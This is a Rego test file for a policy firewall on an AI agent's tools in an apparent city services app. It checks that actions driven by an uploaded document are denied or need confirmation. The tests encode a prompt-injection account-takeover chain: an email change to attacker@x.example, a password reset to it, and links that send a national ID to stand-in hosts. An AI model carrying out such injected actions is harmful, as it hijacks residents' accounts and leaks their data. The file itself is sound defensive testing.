package firewall_test

import data.firewall

# ---- helpers -------------------------------------------------------------

base(overrides) := merged if {
	base := {
		"session_user": "alice",
		"target_owner": "alice",
		"tool": "get_profile",
		"doc_read": false,
		"resident_confirmed": false,
		"args": {},
		"recent_calls": [],
		"personal_values": ["TR-4481927", "alice@cybercity.example", "+10-555-0101"],
	}
	merged := object.union(base, overrides)
}

decide(overrides) := r if {
	r := firewall.result with input as base(overrides)
}

# ---- Allow ---------------------------------------------------------------

test_allow_read_own_profile if {
	r := decide({})
	r.decision == "allow"
}

test_allow_typed_email_change_without_doc if {
	r := decide({
		"tool": "update_contact",
		"doc_read": false,
		"args": {"new_email": {"value": "me@new.example", "origin": "user_typed"}},
	})
	r.decision == "allow"
}

test_allow_typed_reschedule_without_doc if {
	r := decide({
		"tool": "reschedule_appointment",
		"doc_read": false,
		"args": {
			"ref": {"value": "apt-102", "origin": "user_typed"},
			"new_slot": {"value": "2026-10-06T10:00:00", "origin": "user_typed"},
		},
	})
	r.decision == "allow"
}

# ---- Ownership deny ------------------------------------------------------

test_deny_cross_owner if {
	r := decide({
		"tool": "cancel_appointment",
		"target_owner": "bob",
		"args": {"ref": {"value": "apt-330", "origin": "from_document"}},
	})
	r.decision == "deny"
	some m in r.reasons
	contains(m, "another resident")
}

# ---- Contact deny --------------------------------------------------------

test_deny_email_from_document if {
	r := decide({
		"tool": "update_contact",
		"doc_read": true,
		"args": {"new_email": {"value": "attacker@x.example", "origin": "from_document"}},
	})
	r.decision == "deny"
	some m in r.reasons
	contains(m, "came from the uploaded document")
}

test_deny_phone_from_document if {
	r := decide({
		"tool": "update_contact",
		"doc_read": true,
		"args": {"new_phone": {"value": "+1-555-999", "origin": "from_document"}},
	})
	r.decision == "deny"
}

# ---- Password reset ------------------------------------------------------

test_deny_reset_when_doc_read if {
	r := decide({"tool": "send_password_reset", "doc_read": true, "args": {"email": {"value": "a@a", "origin": "from_system"}}})
	r.decision == "deny"
	some m in r.reasons
	contains(m, "password reset")
}

test_deny_reset_after_contact_change if {
	r := decide({
		"tool": "send_password_reset",
		"doc_read": false,
		"args": {"email": {"value": "a@a", "origin": "from_system"}},
		"recent_calls": [{"tool": "update_contact"}],
	})
	r.decision == "deny"
}

# ---- render_link exfil ---------------------------------------------------

test_deny_render_link_leaks_personal if {
	r := decide({
		"tool": "render_link",
		"doc_read": true,
		"args": {"url": {"value": "https://tracker.example/log?id=TR-4481927", "origin": "from_document"}},
	})
	r.decision == "deny"
	some m in r.reasons
	contains(m, "personal data")
}

test_allow_render_link_clean if {
	r := decide({
		"tool": "render_link",
		"doc_read": false,
		"args": {"url": {"value": "https://city.example/help", "origin": "user_typed"}},
	})
	r.decision == "allow"
}

# ---- honey ---------------------------------------------------------------

test_deny_admin_export if {
	r := decide({"tool": "admin_export_all_users"})
	r.decision == "deny"
}

# ---- second cancellation -------------------------------------------------

test_deny_second_cancel if {
	r := decide({
		"tool": "cancel_appointment",
		"doc_read": false,
		"args": {"ref": {"value": "apt-115", "origin": "user_typed"}},
		"recent_calls": [{"tool": "cancel_appointment"}],
	})
	r.decision == "deny"
}

# ---- confirm path --------------------------------------------------------

test_confirm_reschedule_from_document if {
	r := decide({
		"tool": "reschedule_appointment",
		"doc_read": true,
		"args": {
			"ref": {"value": "apt-102", "origin": "from_document"},
			"new_slot": {"value": "2026-10-06T10:00:00", "origin": "from_document"},
		},
	})
	r.decision == "confirm"
}

test_confirm_reschedule_with_typed_ref_but_doc_slot if {
	r := decide({
		"tool": "reschedule_appointment",
		"doc_read": true,
		"args": {
			"ref": {"value": "apt-102", "origin": "user_typed"},
			"new_slot": {"value": "2026-10-06T10:00:00", "origin": "from_document"},
		},
	})
	r.decision == "confirm"
}

test_confirm_turns_into_allow_when_confirmed if {
	r := decide({
		"tool": "reschedule_appointment",
		"doc_read": true,
		"resident_confirmed": true,
		"args": {
			"ref": {"value": "apt-102", "origin": "from_document"},
			"new_slot": {"value": "2026-10-06T10:00:00", "origin": "from_document"},
		},
	})
	r.decision == "allow"
}

test_confirmed_contact_change_from_doc_still_denied if {
	# Deny beats confirm: even resident approval can't unlock a document-driven
	# contact change, because that is a root-of-takeover action.
	r := decide({
		"tool": "update_contact",
		"doc_read": true,
		"resident_confirmed": true,
		"args": {"new_email": {"value": "attacker@x.example", "origin": "from_document"}},
	})
	r.decision == "deny"
}

# ---- takeover chain ------------------------------------------------------

test_takeover_chain_all_denied if {
	# Step 1: change email from document
	r1 := decide({
		"tool": "update_contact",
		"doc_read": true,
		"args": {"new_email": {"value": "attacker@x.example", "origin": "from_document"}},
	})
	r1.decision == "deny"

	# Step 2: send password reset in the same session
	r2 := decide({
		"tool": "send_password_reset",
		"doc_read": true,
		"args": {"email": {"value": "attacker@x.example", "origin": "from_document"}},
	})
	r2.decision == "deny"

	# Step 3: render link exfiltrating national id
	r3 := decide({
		"tool": "render_link",
		"doc_read": true,
		"args": {"url": {"value": "https://x.example/i?v=TR-4481927", "origin": "from_document"}},
	})
	r3.decision == "deny"
}
